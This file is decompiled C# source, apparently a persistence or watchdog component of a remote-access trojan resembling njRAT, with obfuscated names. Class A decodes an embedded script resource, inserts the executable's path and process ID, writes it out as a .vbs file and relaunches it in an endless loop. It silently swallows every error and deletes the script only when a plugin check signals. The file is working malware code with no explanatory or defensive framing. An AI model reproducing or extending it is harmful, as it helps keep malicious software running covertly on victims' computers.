using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using n.My.Resources;

namespace n;

public class A
{
	[AccessedThroughProperty("B")]
	private BackgroundWorker _B;

	public static Process fj = new Process();

	private string u;

	private string z;

	public virtual BackgroundWorker B
	{
		get
		{
			return _B;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DoWorkEventHandler value2 = delegate
			{
				D();
			};
			if (_B != null)
			{
				_B.DoWork -= value2;
			}
			_B = value;
			if (_B != null)
			{
				_B.DoWork += value2;
			}
		}
	}

	public A()
	{
		B = new BackgroundWorker();
		u = Application.get_StartupPath() + "\\" + Process.GetCurrentProcess().Id + ".vbs";
		string s = Resources.Q;
		z = API.DEB(ref s).Replace("NJP", Application.get_ExecutablePath()).Replace("NJF", Conversions.ToString(Process.GetCurrentProcess().Id));
	}

	public void D()
	{
		while (true)
		{
			try
			{
				File.WriteAllText(u, z);
				fj.StartInfo.FileName = u;
				fj.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			do
			{
				try
				{
					string C = "plugin.C";
					string S = "Fwd";
					object P = new object[1] { "Windows Script Host" };
					if (Operators.ConditionalCompareObjectGreater(n.C.inv(ref n.C.Plug, ref C, ref S, ref P), (object)0, false))
					{
						fj.Kill();
						try
						{
							File.Delete(u);
							return;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(100);
			}
			while (!fj.WaitForExit(100));
		}
	}
}
